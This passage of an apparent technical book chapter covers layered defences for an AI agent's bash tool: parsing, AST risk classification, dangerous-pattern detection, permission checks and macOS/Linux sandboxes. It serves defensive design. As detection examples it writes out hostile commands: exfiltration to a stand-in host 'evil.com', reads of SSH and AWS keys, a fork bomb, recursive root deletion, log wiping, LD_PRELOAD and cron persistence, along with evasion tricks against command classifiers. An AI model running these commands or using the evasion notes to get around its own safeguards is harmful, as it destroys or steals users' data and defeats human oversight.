+<td><code>sh -c "cmd"</code></td>
+<td>Same as above</td>
+<td>Same analysis</td>
+</tr>
+<tr>
+<td><code>env KEY=val cmd</code></td>
+<td>Runs cmd with modified environment</td>
+<td>Must classify the inner command</td>
+</tr>
+</tbody>
+</table>
+<p>For <code>eval</code> and <code>bash -c</code>, the system recursively parses the argument string and analyzes the inner AST. This catches evasion through indirection:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Without recursive analysis, this looks like &quot;bash with a string argument&quot;:</span>
+bash<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;rm -rf /&#39;</span>
+
+<span class="c1"># With recursive analysis, the inner command is parsed and classified as DESTRUCTIVE</span>
+</code></pre></div>
+
+<p>The recursion has a depth limit (typically 3-5 levels) to prevent adversarial nesting: <code>bash -c "bash -c \"bash -c 'bash -c ...'\""</code>. Beyond the depth limit, the command is classified as <code>UNKNOWN</code> and handled by downstream layers.</p>
+<h3 id="pipeline-and-list-analysis">Pipeline and List Analysis</h3>
+<p>For compound commands, the classification is the maximum risk of any component:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Pipeline: max(READ-ONLY, DESTRUCTIVE) = DESTRUCTIVE</span>
+git<span class="w"> </span>log<span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>rm<span class="w"> </span>-rf
+
+<span class="c1"># List: max(DEV-TOOL, DESTRUCTIVE) = DESTRUCTIVE</span>
+cargo<span class="w"> </span><span class="nb">test</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/
+
+<span class="c1"># Group: max(READ-ONLY, WRITE) = WRITE</span>
+<span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;starting&quot;</span><span class="p">;</span><span class="w"> </span>npm<span class="w"> </span>install<span class="p">;</span><span class="w"> </span><span class="o">}</span>
+</code></pre></div>
+
+<p>This conservative approach means that a safe command chained with a dangerous command escalates the entire chain. This prevents the "trojan horse" pattern where a benign first command establishes user trust and the dangerous second command executes under that false trust.</p>
+<h3 id="ast-rewriting-for-analysis">AST Rewriting for Analysis</h3>
+<p>Some shell features require AST rewriting before classification. Brace expansion, for example, transforms a single token into multiple tokens:</p>
+<div class="codehilite"><pre><span></span><code>rm<span class="w"> </span>-rf<span class="w"> </span>/usr/<span class="o">{</span>bin,lib,share<span class="o">}</span>
+<span class="c1"># After brace expansion: rm -rf /usr/bin /usr/lib /usr/share</span>
+</code></pre></div>
+
+<p>The analyzer must expand braces to classify the actual paths being targeted. Similarly, tilde expansion (<code>~</code> to the home directory) and glob patterns (<code>*.py</code>) must be resolved to understand which files the command affects.</p>
+<hr />
+<h2 id="196-layer-3-dangerous-pattern-detection">19.6 Layer 3: Dangerous Pattern Detection</h2>
+<p>Layer 3 applies structured pattern matching to both the raw command string and the AST. This layer catches known-dangerous patterns that the AST classification in Layer 2 might miss due to incomplete parsing or novel evasion techniques.</p>
+<h3 id="the-eight-categories">The Eight Categories</h3>
+<p>Dangerous patterns are organized into eight categories, each targeting a different class of threat:</p>
+<h4 id="category-1-filesystem-destruction">Category 1: Filesystem Destruction</h4>
+<p>Commands that delete, overwrite, or corrupt files and directories:</p>
+<div class="codehilite"><pre><span></span><code>rm -rf /          Recursive forced deletion from root
+rm -rf /*         Delete all top-level directories
+rm -rf ~          Delete home directory
+<span class="k">&gt; </span><span class="ge">/important/file  Truncate file to zero bytes</span>
+mv /etc /dev/null  Move system directory to null device
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Look for recursive deletion commands targeting system paths (<code>/</code>, <code>/etc</code>, <code>/usr</code>, <code>/var</code>, <code>/home</code>, <code>/root</code>). Flag any <code>rm -rf</code> where the target resolves to a path above the project directory.</p>
+<h4 id="category-2-privilege-escalation">Category 2: Privilege Escalation</h4>
+<p>Commands that gain elevated permissions or modify access controls:</p>
+<div class="codehilite"><pre><span></span><code>sudo su -                        Switch to root
+chmod 777 /                      World-writable root
+chmod -R 777 /etc                Recursive world-writable system dir
+chown -R $USER:$GROUP /usr       Take ownership of system directory
+setuid on an executable          Enable SUID bit
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Flag <code>sudo</code> with interactive commands, <code>chmod</code> with <code>777</code> or SUID patterns, and <code>chown</code> targeting system directories.</p>
+<h4 id="category-3-network-exfiltration">Category 3: Network Exfiltration</h4>
+<p>Commands that send data to external servers:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="err">@</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">com</span><span class="w">      </span><span class="n">Upload</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">contents</span>
+<span class="n">cat</span><span class="w"> </span><span class="o">~/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="n">Pipe</span><span class="w"> </span><span class="n">secrets</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">netcat</span>
+<span class="n">wget</span><span class="w"> </span><span class="o">-</span><span class="n">q</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="o">-</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sh</span><span class="w">         </span><span class="n">Download</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">execute</span>
+<span class="n">scp</span><span class="w"> </span><span class="n">sensitive</span><span class="o">.</span><span class="n">db</span><span class="w"> </span><span class="n">user</span><span class="err">@</span><span class="n">evil</span><span class="o">.</span><span class="n">com</span><span class="p">:</span><span class="w">    </span><span class="n">Copy</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="k">remote</span>
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Flag any command that combines file-reading operations (<code>cat</code>, <code>$()</code>, redirection) with network-sending operations (<code>curl -d</code>, <code>nc</code>, <code>scp</code>, <code>rsync</code> to external hosts). The combination is the threat --- reading a file is fine, sending data is fine, but reading a sensitive file and sending it is exfiltration.</p>
+<h4 id="category-4-credential-theft">Category 4: Credential Theft</h4>
+<p>Commands that read, copy, or transmit credential files:</p>
+<div class="codehilite"><pre><span></span><code>cat ~/.ssh/id_rsa                Read SSH private key
+cat ~/.aws/credentials           Read AWS credentials
+printenv | grep KEY              Extract API keys from environment
+history                          Read command history (may contain tokens)
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Maintain a list of known credential paths (see Chapter 18's protected path patterns) and flag any command that reads them. Also flag commands that dump environment variables, as environment variables often contain API keys and tokens.</p>
+<h4 id="category-5-history-and-audit-manipulation">Category 5: History and Audit Manipulation</h4>
+<p>Commands that tamper with logs, shell history, or audit trails:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">history</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w">                       </span><span class="n">Clear</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">history</span>
+<span class="n">unset</span><span class="w"> </span><span class="n">HISTFILE</span><span class="w">                   </span><span class="n">Disable</span><span class="w"> </span><span class="n">history</span><span class="w"> </span><span class="n">recording</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="o">~/.</span><span class="n">bash_history</span><span class="w">                </span><span class="n">Truncate</span><span class="w"> </span><span class="n">history</span><span class="w"> </span><span class="n">file</span>
+<span class="n">shred</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">auth</span><span class="o">.</span><span class="n">log</span><span class="w">      </span><span class="n">Securely</span><span class="w"> </span><span class="n">delete</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="nb">log</span>
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Flag commands that modify or delete history files, unset history-related variables, or target log directories.</p>
+<h4 id="category-6-process-manipulation">Category 6: Process Manipulation</h4>
+<p>Commands that interfere with other processes or system services:</p>
+<div class="codehilite"><pre><span></span><code>kill -9 -1                       Kill all user processes
+killall -9 sshd                  Kill SSH daemon
+:(){ :|:&amp; };:                    Fork bomb (exhaust process table)
+nohup backdoor &amp;                 Start persistent background process
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Flag <code>kill</code> commands targeting system processes, fork patterns (a function that calls itself with piping and backgrounding), and commands that start persistent background processes with <code>nohup</code> or <code>disown</code>.</p>
+<h4 id="category-7-environment-modification">Category 7: Environment Modification</h4>
+<p>Commands that modify the shell environment in ways that persist beyond the current command:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">export</span><span class="w"> </span><span class="n">PATH</span><span class="o">=</span><span class="s2">&quot;/evil/bin:$PATH&quot;</span><span class="w">    </span><span class="n">Prepend</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">PATH</span>
+<span class="n">alias</span><span class="w"> </span><span class="n">sudo</span><span class="o">=</span><span class="s1">&#39;evil_sudo&#39;</span><span class="w">           </span><span class="n">Shadow</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">malicious</span><span class="w"> </span><span class="n">function</span>
+<span class="k">export</span><span class="w"> </span><span class="n">LD_PRELOAD</span><span class="o">=/</span><span class="n">evil</span><span class="o">/</span><span class="n">lib</span><span class="o">.</span><span class="n">so</span><span class="w">   </span><span class="n">Inject</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">processes</span>
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Flag modifications to security-critical environment variables (<code>PATH</code>, <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code>, <code>HOME</code>, <code>SHELL</code>) and alias/function definitions that shadow security-sensitive commands.</p>
+<h4 id="category-8-persistence-mechanisms">Category 8: Persistence Mechanisms</h4>
+<p>Commands that install mechanisms to survive beyond the current session:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">crontab</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w">                       </span><span class="n">Modify</span><span class="w"> </span><span class="n">cron</span><span class="w"> </span><span class="n">schedule</span>
+<span class="n">echo</span><span class="w"> </span><span class="s2">&quot;* * * * * cmd&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w">  </span><span class="n">Install</span><span class="w"> </span><span class="n">cron</span><span class="w"> </span><span class="n">job</span>
+<span class="n">echo</span><span class="w"> </span><span class="s2">&quot;cmd&quot;</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="o">~/.</span><span class="n">bashrc</span><span class="w">          </span><span class="n">Execute</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">every</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">start</span>
+<span class="n">systemctl</span><span class="w"> </span><span class="n">enable</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">service</span><span class="w">    </span><span class="n">Enable</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">boot</span>
+<span class="n">launchctl</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">evil</span><span class="o">.</span><span class="n">plist</span><span class="w">        </span><span class="n">macOS</span><span class="p">:</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">launch</span><span class="w"> </span><span class="n">agent</span>
+</code></pre></div>
+
+<p><strong>Detection strategy:</strong> Flag modifications to cron, systemd, launchd, shell RC files, and system startup directories.</p>
+<h3 id="pattern-matching-implementation">Pattern Matching Implementation</h3>
+<p>Each pattern is a structured record with metadata:</p>
+<div class="codehilite"><pre><span></span><code><span class="nl">Pattern</span><span class="p">:</span>
+<span class="w">  </span><span class="nl">id</span><span class="p">:</span><span class="w">          </span><span class="ss">&quot;rm-rf-root&quot;</span>
+<span class="w">  </span><span class="nl">category</span><span class="p">:</span><span class="w">    </span><span class="n">FilesystemDestruction</span>
+<span class="w">  </span><span class="nl">severity</span><span class="p">:</span><span class="w">    </span><span class="n">Critical</span>
+<span class="w">  </span><span class="nl">regex</span><span class="p">:</span><span class="w">       </span><span class="n">rm</span><span class="err">\</span><span class="n">s</span><span class="o">+</span><span class="p">(</span><span class="o">-[</span><span class="n">rf</span><span class="o">]</span><span class="err">{</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="err">}\</span><span class="n">s</span><span class="o">+</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="c1">--(force|recursive)\s+)*[/~]</span>
+<span class="w">  </span><span class="nl">description</span><span class="p">:</span><span class="w"> </span><span class="ss">&quot;Recursive forced deletion from root or home&quot;</span>
+<span class="w">  </span><span class="k">action</span><span class="err">:</span><span class="w">      </span><span class="n">Block</span><span class="w"> </span><span class="p">(</span><span class="k">with</span><span class="w"> </span><span class="n">explanation</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Patterns are applied against both the raw command string (catching simple cases) and individual AST nodes (catching commands hidden in pipelines or compound statements). The dual application ensures that a dangerous command is caught whether it appears at the top level or nested inside a subshell.</p>
+<hr />
+<h2 id="197-layer-4-per-command-permission-evaluation">19.7 Layer 4: Per-Command Permission Evaluation</h2>
+<p>After AST analysis and pattern matching, the command reaches the permission system described in Chapter 18. At this layer, the command's risk classification feeds into the permission evaluation algorithm:</p>
+<ul>
+<li><strong>READ-ONLY</strong> commands are auto-approved in all modes except deny-all.</li>
+<li><strong>DEV-TOOL</strong> commands are auto-approved in auto and bypass modes.</li>
+<li><strong>WRITE</strong> commands trigger the rule cascade (deny/ask/allow matching).</li>
+<li><strong>SYSTEM-MODIFY</strong> commands always ask in default mode, always escalate in auto mode.</li>
+<li><strong>DESTRUCTIVE</strong> commands are blocked before reaching the permission system (Layer 3 catches them).</li>
+<li><strong>UNKNOWN</strong> commands are treated as WRITE by default.</li>
+</ul>
+<p>The integration point between the bash security layers and the permission system is the risk classification. Layers 1-3 produce the classification; Layer 4 evaluates it against the user's configured permission rules.</p>
+<hr />
+<h2 id="198-layer-5-os-level-sandbox-enforcement">19.8 Layer 5: OS-Level Sandbox Enforcement</h2>
+<p>The final layer is the operating system sandbox. Even if all four previous layers fail --- the parser misses a construct, the AST analyzer misclassifies the command, the pattern matcher does not recognize the pattern, and the permission system approves it --- the sandbox limits the damage.</p>
+<h3 id="macos-seatbelt-sandbox-exec">macOS: Seatbelt (sandbox-exec)</h3>
+<p>macOS provides the <code>sandbox-exec</code> system call, which enforces a profile that restricts process capabilities:</p>
+<div class="codehilite"><pre><span></span><code><span class="o">(</span><span class="nt">version</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span>
+<span class="o">(</span><span class="nt">deny</span><span class="w"> </span><span class="nt">default</span><span class="o">)</span><span class="w">                          </span><span class="o">;</span><span class="w"> </span><span class="nt">Deny</span><span class="w"> </span><span class="nt">everything</span><span class="w"> </span><span class="nt">by</span><span class="w"> </span><span class="nt">default</span>
+
+<span class="o">(</span><span class="nt">allow</span><span class="w"> </span><span class="nt">file-read</span><span class="o">*)</span><span class="w">                      </span><span class="o">;</span><span class="w"> </span><span class="nt">Allow</span><span class="w"> </span><span class="nt">reading</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">file</span>
+<span class="o">(</span><span class="nt">allow</span><span class="w"> </span><span class="nt">file-write</span><span class="o">*</span>
+<span class="w">  </span><span class="o">(</span><span class="nt">subpath</span><span class="w"> </span><span class="s2">&quot;/Users/dev/project&quot;</span><span class="o">)</span><span class="w">        </span><span class="o">;</span><span class="w"> </span><span class="nt">Allow</span><span class="w"> </span><span class="nt">writing</span><span class="w"> </span><span class="nt">only</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">project</span><span class="w"> </span><span class="nt">dir</span>
+<span class="w">  </span><span class="o">(</span><span class="nt">subpath</span><span class="w"> </span><span class="s2">&quot;/tmp&quot;</span><span class="o">)</span><span class="w">                      </span><span class="o">;</span><span class="w"> </span><span class="nt">Allow</span><span class="w"> </span><span class="nt">writing</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="o">/</span><span class="nt">tmp</span>
+<span class="w">  </span><span class="o">(</span><span class="nt">subpath</span><span class="w"> </span><span class="s2">&quot;/private/tmp&quot;</span><span class="o">))</span><span class="w">             </span><span class="o">;</span><span class="w"> </span><span class="nt">Allow</span><span class="w"> </span><span class="nt">writing</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">macOS</span><span class="w"> </span><span class="o">/</span><span class="nt">tmp</span>
+
+<span class="o">(</span><span class="nt">deny</span><span class="w"> </span><span class="nt">file-write</span><span class="o">*</span>
+<span class="w">  </span><span class="o">(</span><span class="nt">subpath</span><span class="w"> </span><span class="s2">&quot;/Users/dev/project/.env&quot;</span><span class="o">)</span><span class="w">   </span><span class="o">;</span><span class="w"> </span><span class="nt">Deny</span><span class="w"> </span><span class="nt">writing</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="p">.</span><span class="nc">env</span>
+<span class="w">  </span><span class="o">(</span><span class="nt">subpath</span><span class="w"> </span><span class="s2">&quot;/Users/dev/project/.git&quot;</span><span class="o">))</span><span class="w">  </span><span class="o">;</span><span class="w"> </span><span class="nt">Deny</span><span class="w"> </span><span class="nt">writing</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="p">.</span><span class="nc">git</span><span class="w"> </span><span class="nt">directly</span>
+
+<span class="o">(</span><span class="nt">allow</span><span class="w"> </span><span class="nt">process-exec</span><span class="o">)</span><span class="w">                    </span><span class="o">;</span><span class="w"> </span><span class="nt">Allow</span><span class="w"> </span><span class="nt">running</span><span class="w"> </span><span class="nt">programs</span>
+<span class="o">(</span><span class="nt">deny</span><span class="w"> </span><span class="nt">network</span><span class="o">*)</span><span class="w">                         </span><span class="o">;</span><span class="w"> </span><span class="nt">Deny</span><span class="w"> </span><span class="nt">all</span><span class="w"> </span><span class="nt">network</span><span class="w"> </span><span class="nt">access</span>
+<span class="o">(</span><span class="nt">allow</span><span class="w"> </span><span class="nt">network</span><span class="o">*</span>
+<span class="w">  </span><span class="o">(</span><span class="nt">local</span><span class="w"> </span><span class="nt">ip</span><span class="w"> </span><span class="s2">&quot;localhost:*&quot;</span><span class="o">))</span><span class="w">             </span><span class="o">;</span><span class="w"> </span><span class="nt">Except</span><span class="w"> </span><span class="nt">localhost</span>
+</code></pre></div>
+
+<p>The sandbox profile operates at the syscall level --- it cannot be bypassed by shell tricks, encoding, or indirection. If the profile denies network access, <code>curl</code> fails regardless of how the command was constructed. This is why the sandbox is the last line of defense: it operates below the abstraction level that attackers manipulate.</p>
+<p><strong>Limitations:</strong> macOS seatbelt profiles are inflexible at runtime. The profile is set when the process launches and cannot be modified. This means the sandbox must be configured for the entire session, not per-command. A session that needs network access for <code>git push</code> cannot have a "deny network" sandbox, even if most commands should not access the network.</p>
+<h3 id="linux-seccomp-bpf">Linux: seccomp-BPF</h3>
+<p>Linux uses seccomp-BPF (Secure Computing Mode with Berkeley Packet Filter) for syscall filtering:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// Allow only a whitelist of syscalls</span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">sock_filter</span><span class="w"> </span><span class="n">filter</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_LD</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">BPF_W</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">BPF_ABS</span><span class="p">,</span><span class="w"> </span>
+<span class="w">             </span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">seccomp_data</span><span class="p">,</span><span class="w"> </span><span class="n">nr</span><span class="p">)),</span>
+
+<span class="w">    </span><span class="c1">// Allow read, write, open, close, stat, fstat</span>
+<span class="w">    </span><span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">SYS_read</span><span class="p">),</span>
+<span class="w">    </span><span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">SYS_write</span><span class="p">),</span>
+<span class="w">    </span><span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">SYS_openat</span><span class="p">),</span>
+<span class="w">    </span><span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">SYS_close</span><span class="p">),</span>
+<span class="w">    </span><span class="n">ALLOW_SYSCALL</span><span class="p">(</span><span class="n">SYS_fstat</span><span class="p">),</span>
+
+<span class="w">    </span><span class="c1">// Block network syscalls</span>
+<span class="w">    </span><span class="n">DENY_SYSCALL</span><span class="p">(</span><span class="n">SYS_socket</span><span class="p">),</span>
+<span class="w">    </span><span class="n">DENY_SYSCALL</span><span class="p">(</span><span class="n">SYS_connect</span><span class="p">),</span>
+<span class="w">    </span><span class="n">DENY_SYSCALL</span><span class="p">(</span><span class="n">SYS_bind</span><span class="p">),</span>
+<span class="w">    </span><span class="n">DENY_SYSCALL</span><span class="p">(</span><span class="n">SYS_listen</span><span class="p">),</span>
+
+<span class="w">    </span><span class="c1">// Default: kill process on unauthorized syscall</span>
+<span class="w">    </span><span class="n">BPF_STMT</span><span class="p">(</span><span class="n">BPF_RET</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">BPF_K</span><span class="p">,</span><span class="w"> </span><span class="n">SECCOMP_RET_KILL</span><span class="p">),</span>
+<span class="p">};</span>
+</code></pre></div>
+
+<p>seccomp-BPF is more granular than macOS seatbelt --- it can filter individual syscalls with argument inspection. However, it is also harder to configure correctly. A profile that blocks <code>SYS_socket</code> prevents not just <code>curl</code> but also local Unix domain sockets, which many legitimate tools use for IPC.</p>
+<h3 id="network-restrictions">Network Restrictions</h3>
+<p>Both sandbox mechanisms can restrict network access, but the granularity differs:</p>
+<table>
+<thead>
+<tr>
+<th>Sandbox</th>
+<th>Network Restriction Granularity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>macOS seatbelt</td>
+<td>Per-IP, per-port, local vs remote</td>
+</tr>
+<tr>
+<td>Linux seccomp</td>
+<td>Per-syscall (socket, connect, bind)</td>
+</tr>
+<tr>
+<td>Linux network namespaces</td>
+<td>Complete network isolation</td>
+</tr>
+</tbody>
+</table>
+<p>For most AI agents, the right network policy is "allow localhost, deny everything else." This permits local dev servers, databases, and MCP servers while blocking exfiltration to external hosts. Tools that need network access (like <code>git push</code> or <code>npm publish</code>) can be exempted by running them outside the sandbox, with the permission system controlling when the exemption is granted.</p>
+<h3 id="sandbox-design-patterns">Sandbox Design Patterns</h3>
+<p><strong>Pattern: Progressive sandbox relaxation.</strong> Start with a tight sandbox (deny all writes, deny network) and relax restrictions as the user approves specific operations. This mirrors the progressive trust concept from Chapter 18.</p>
+<p><strong>Pattern: Per-command sandbox profiles.</strong> Instead of one sandbox for the entire session, apply different sandbox profiles to different commands based on their risk classification. A <code>git status</code> gets the tight profile (deny writes, deny network). A <code>git push</code> gets a looser profile (allow network). This requires process-level sandboxing with profile selection per spawn.</p>
+<p><strong>Pattern: Sandbox verification.</strong> Before executing any bash command, verify that the sandbox is active. If the sandbox process crashes or fails to initialize, fall back to deny-all mode rather than executing commands without containment.</p>
+<hr />
+<h2 id="199-path-analysis-and-resolution">19.9 Path Analysis and Resolution</h2>
+<p>Several security layers need to know which files a command will affect. Determining the actual target paths of a shell command is surprisingly complex.</p>
+<h3 id="relative-path-resolution">Relative Path Resolution</h3>
+<div class="codehilite"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/tmp<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>../../etc/passwd
+</code></pre></div>
+
+<p>The <code>rm</code> command's argument is relative to <code>/tmp</code>, so the actual target is <code>/etc/passwd</code>. The path analyzer must track <code>cd</code> commands within compound statements and resolve relative paths accordingly.</p>
+<h3 id="symlink-detection">Symlink Detection</h3>
+<div class="codehilite"><pre><span></span><code>ln<span class="w"> </span>-s<span class="w"> </span>/etc/passwd<span class="w"> </span>/tmp/innocent.txt
+rm<span class="w"> </span>/tmp/innocent.txt<span class="w">  </span><span class="c1"># Actually deletes /etc/passwd</span>
+</code></pre></div>
+
+<p>The path analyzer should resolve symlinks to determine the actual target. This requires filesystem access (calling <code>readlink</code> or equivalent), which introduces a TOCTOU (time-of-check-time-of-use) race: the symlink could be created between analysis and execution. The sandbox (Layer 5) mitigates this by restricting which paths can be written regardless of symlinks.</p>
+<h3 id="directory-traversal">Directory Traversal</h3>
+<div class="codehilite"><pre><span></span><code>cat<span class="w"> </span>../../../../etc/shadow
+</code></pre></div>
+
+<p>Paths with <code>..</code> components must be resolved to their canonical form before checking against protected path lists. The <code>..</code> resolution must be filesystem-aware: <code>/home/user/../../../etc</code> resolves to <code>/etc</code>, not to a directory above root.</p>
+<h3 id="glob-expansion">Glob Expansion</h3>
+<div class="codehilite"><pre><span></span><code>rm<span class="w"> </span>-rf<span class="w"> </span>/etc/p*
+</code></pre></div>
+
+<p>Glob patterns match against the actual filesystem. The path analyzer must expand globs to determine which files would be affected. This is expensive (it requires filesystem enumeration) and imperfect (the filesystem state at analysis time may differ from execution time). The pragmatic approach is to check whether the glob's non-wildcard prefix matches a protected directory, without fully expanding the glob.</p>
+<hr />
+<h2 id="1910-defense-in-depth-why-all-five-layers-matter">19.10 Defense-in-Depth: Why All Five Layers Matter</h2>
+<p>No single layer is sufficient. Each has weaknesses:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Weakness</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parser</td>
+<td>May not handle all bash syntax edge cases</td>
+</tr>
+<tr>
+<td>AST Analysis</td>
+<td>Cannot resolve runtime values (variables, command substitution results)</td>
+</tr>
+<tr>
+<td>Pattern Matching</td>
+<td>Static patterns cannot anticipate novel evasion techniques</td>
+</tr>
+<tr>
+<td>Permission System</td>
+<td>Users can approve dangerous commands; auto-mode classifier can make mistakes</td>
+</tr>
+<tr>
+<td>Sandbox</td>
+<td>Configured for the session, not per-command; may be too loose or too tight</td>
+</tr>
+</tbody>
+</table>
+<p>Together, they compensate for each other's weaknesses:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">graph</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">subgraph</span><span class="w"> </span><span class="n">Layers</span><span class="p">[</span><span class="s">&quot;How Layers Compensate&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">A</span><span class="p">[</span><span class="s">&quot;Parser misses&lt;br/&gt;encoded command&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">B</span><span class="p">[</span><span class="s">&quot;Pattern matcher&lt;br/&gt;catches base64 pipe&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">C</span><span class="p">[</span><span class="s">&quot;AST misses&lt;br/&gt;alias indirection&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">D</span><span class="p">[</span><span class="s">&quot;Sandbox blocks&lt;br/&gt;unauthorized file write&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">E</span><span class="p">[</span><span class="s">&quot;Pattern matcher misses&lt;br/&gt;novel command&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">F</span><span class="p">[</span><span class="s">&quot;Permission system&lt;br/&gt;asks user&quot;</span><span class="p">]</span>
+<span class="w">        </span><span class="n">G</span><span class="p">[</span><span class="s">&quot;User approves&lt;br/&gt;bad command&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="n">H</span><span class="p">[</span><span class="s">&quot;Sandbox limits&lt;br/&gt;blast radius&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="kd">end</span>
+</code></pre></div>
+
+<p>The key insight: each layer is designed to catch the failures of the layers above it. The parser catches what regex would miss. AST analysis catches what the parser cannot classify. Pattern matching catches known dangerous patterns regardless of how they are expressed. The permission system catches novel threats by asking the human. The sandbox catches everything that gets past the human.</p>
+<hr />
+<h2 id="1911-real-world-evasion-techniques-and-how-each-layer-responds">19.11 Real-World Evasion Techniques and How Each Layer Responds</h2>
+<p>Theory is one thing. Here are concrete evasion attempts and how the five-layer architecture handles each:</p>
+<h3 id="evasion-unicode-homoglyph-substitution">Evasion: Unicode Homoglyph Substitution</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># The &quot;r&quot; in &quot;rm&quot; is actually a Cyrillic &quot;р&quot; (U+0440)</span>
+рm<span class="w"> </span>-rf<span class="w"> </span>/
+</code></pre></div>
+
+<ul>
+<li><strong>Layer 1 (Parser):</strong> Parses normally --- the parser sees a command token.</li>
+<li><strong>Layer 2 (AST Analysis):</strong> Fails to classify --- <code>рm</code> is not in the known command database.</li>
+<li><strong>Layer 3 (Pattern Matching):</strong> String patterns may miss if not Unicode-normalized. A well-designed pattern matcher normalizes Unicode before matching.</li>
